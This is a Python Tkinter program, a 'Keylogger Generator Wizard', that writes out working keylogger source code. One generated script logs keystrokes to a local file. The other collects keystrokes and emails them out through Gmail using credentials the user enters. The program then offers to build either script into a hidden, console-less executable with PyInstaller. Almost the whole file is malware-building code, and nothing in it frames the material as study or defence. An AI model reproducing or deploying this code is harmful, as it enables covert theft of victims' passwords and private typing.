import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import subprocess
from PIL import Image, ImageTk

def save_input_email_keylogger():
    global entry_1, entry_2
    
    # Get the input from the textboxes
    user_input_1 = entry_1.get()
    user_input_2 = entry_2.get()
    
    question_email_1 = messagebox.askyesno("Verify", f"Verify the information:\nEmail: {user_input_1}\nApp-Password: {user_input_2}")

    if question_email_1:
        global saved_input_1, saved_input_2
        saved_input_1 = user_input_1
        saved_input_2 = user_input_2

        # Generate keylogger script       
        with open('email-keylogger.py', 'w') as eKeylog:

            eKeylog.write("""import smtplib
import time
import yaml
from pynput.keyboard import Listener

email = '{}'
password = '{}'

log = ""

def send_log():
    global log
    if log:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, log)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {{e}}")
        log = ""

def on_press(key):
    global log
    log += str(key)
    if len(log) > 100:  # Send email if log length exceeds 100 characters
        send_log()

with Listener(on_press=on_press) as listener:
    while True:
        time.sleep(60)
        send_log()
        listener.join()
""".format(saved_input_1, saved_input_2))

        messagebox.showinfo("Info", "The program has generated a script for you :) ")

        convert_to_exe('email-keylogger.py')

    else:
        pass

def on_button_click_email_keylogger():
    global entry_1, entry_2

    disable_other_buttons("email")

    tk.Label(root, text="Type your Gmail address", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.3, anchor="center")
    entry_1 = tk.Entry(root, width=30)
    entry_1.place(relx=0.6, rely=0.4, anchor="center")

    tk.Label(root, text="Enter your app-password", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.5, anchor="center")
    entry_2 = tk.Entry(root, width=30)
    entry_2.place(relx=0.6, rely=0.6, anchor="center")

    save_button_email_keylogger = tk.Button(root, text="Generate", font=("Helvetica", 10), command=save_input_email_keylogger, bg="white", fg="black")
    save_button_email_keylogger.place(relx=0.6, rely=0.7, anchor="center")


def on_button_click_simple_keylogger():
    
    disable_other_buttons("simple")

    with open('simple-keylogger.py', 'w') as SKeylog:
        SKeylog.write("""from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    with open('keylogfile.txt', 'a') as keylog:
        keylog.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()
""")
        
    messagebox.showinfo("Info", f" Simple keylogger has been successfully created !!")

    convert_to_exe('simple-keylogger.py')
    enable_buttons("end")

def convert_to_exe(script_name):

    response = messagebox.askyesno("Convert to EXE", f"Do you want to convert {script_name} to an executable (EXE) file?")
    
    if response:
        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', script_name])        
        messagebox.showinfo("Info", f"{script_name} has been successfully converted to exe :) ")

    else:
        pass

def disable_other_buttons(selected_button):
    if selected_button == "simple":
        keylogger_button_1.config(state="disabled")
    if selected_button == "email":
        keylogger_button_2.config(state="disabled")

def enable_buttons(selected_button):
    if selected_button == "end":
        keylogger_button_1.config(state="normal")
        keylogger_button_2.config(state="normal")

# Init Tkinter
root = tk.Tk()
root.title("Keylogger Generator Wizard")
root.geometry("600x400")
root.resizable(width=False, height=False)

# Load the background image
bg_image = Image.open("bgimg.jpg")

bg_image = bg_image.resize((600, 400), Image.LANCZOS)

bg_photo = ImageTk.PhotoImage(bg_image)

bg_label = tk.Label(root, image=bg_photo)
bg_label.place(relwidth=1, relheight=1)

# --- Keylogger Wizard Widgets --- 
tk.Label(root, text="Keylogger Generator Wizard", font=('Helvetica', 12), bg="#f0f0f0").place(relx=0.5, rely=0.1, anchor="center")

# Simple Keylogger Widgets
keylogger_button_1 = tk.Button(root, text="Simple Keylogger", font=('Helvetica', 10), command=on_button_click_simple_keylogger, bg="white", fg="black")
keylogger_button_1.place(relx=0.3, rely=0.2, anchor="center")

# Email Keylogger Widgets
keylogger_button_2 = tk.Button(root, text="Email Keylogger", font=('Helvetica', 10), command=on_button_click_email_keylogger, bg="white", fg="black")
keylogger_button_2.place(relx=0.6, rely=0.2, anchor="center")

root.mainloop()
